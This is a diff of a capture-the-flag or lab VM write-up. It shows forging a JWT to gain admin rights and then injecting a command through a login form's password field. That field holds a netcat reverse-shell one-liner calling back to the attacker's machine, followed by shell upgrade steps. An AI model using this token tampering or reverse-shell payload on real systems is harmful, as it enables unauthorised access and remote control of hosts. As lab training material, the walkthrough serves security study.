@@ -178,36 +178,26 @@ To capture the jwt token in burp-suite, go to the login page:
 {"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJjYXB0YWluIiwiZW1haWwiOiJjYXB0YWluQGJvdC5jbyIsInVzZXJuYW1lIjoiY2FwdGFpbiIsImF1dGhfbGV2ZWwiOiJzdGFuZGFyZF91c2VyIn0sImlhdCI6MTU0MDE0NjUyNywiZXhwIjoxNTQwNzUxMzI3fQ.ftpkxIDUp8mpqnq9N561waOcPtlfrrPvdgq-HVtAfUo","user":{"name":"captain","username":"captain","email":"captain@bot.co","auth_level":"standard_user"}}
 ```
 
-Now go to [jwt.io](https://jwt.io/), past the token, change the value of `"auth_level" : "master_admin_user"` and repast the new token in `burp-suite`, change too the value of `auth_level` in `burp-suite`, forward the request and you are admin.
+Now go to [jwt.io](https://jwt.io/), past this token and change the value of `"auth_level" : "master_admin_user"`.  
+
+Before forward the request with `burp`, we modify the request.  
+
+we replace the token by the one of `jwt.io` and change the value of `"auth_level":"master_admin_user"`.  
+
+Forward the new request and you are an admin.  
 
 Next, you go on the tab `admin` to look a weird formular
 
 ```txt
 Please authenticate with the Link+ CLI Tool to use Link+
 ```
-A first capture with burp-suite show the follow:
+I've re-watch the file `deobs.js`, test many other obscur commands. but nothing...  
+So, a bit frustate here, i look among other solutions (ya it's suck), this formular is vulnerable to an RCE (Remote Code Execution).  
+I know there are the source code of this vm somewhere and the message above the formular talk about `CLI tools` but it's not a real solution to detect this type of vulnerability.  
+If someone know a tool to detect this, pls let me know :)
 
-```txt
-POST /users/linkauthenticate HTTP/1.1
-Referer: http://192.168.2.71/dashboard
+So anyways, let's look how it work, we create an useless file and start a http server:
 
-{
-  "username": "aze",
-  "password": "aze"
-}
-```
-And the response from server:
-
-```txt
-{"success":false,"msg":"Wrong password"}
-```
-
-I've re-watch the file `deobs.js` but nothing relevant.
-
-```js
-l.prototype.authenticateLinkUser=function(l){
-  return this.http.post("/users/linkauthenticate",l
-```
     $ touch useless.txt
     $ python2.7 -m SimpleHTTPServer 4444
 
@@ -228,7 +218,7 @@ And test a command found on [pentestmonkey](http://pentestmonkey.net/cheat-sheet
 Username: ninja
 Password: $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.13 1234 >/tmp/f)
 ```
-We are behind, now privilege escalation, we can close `burp-suite` and we change the shell to `/bin/bash`:
+We are inside, now privilege escalation, we can close `burp-suite` and change the shell to `/bin/bash`:
 
      $ python -c 'import pty; pty.spawn("/bin/sh")'
      $ echo "$(uname -a)"
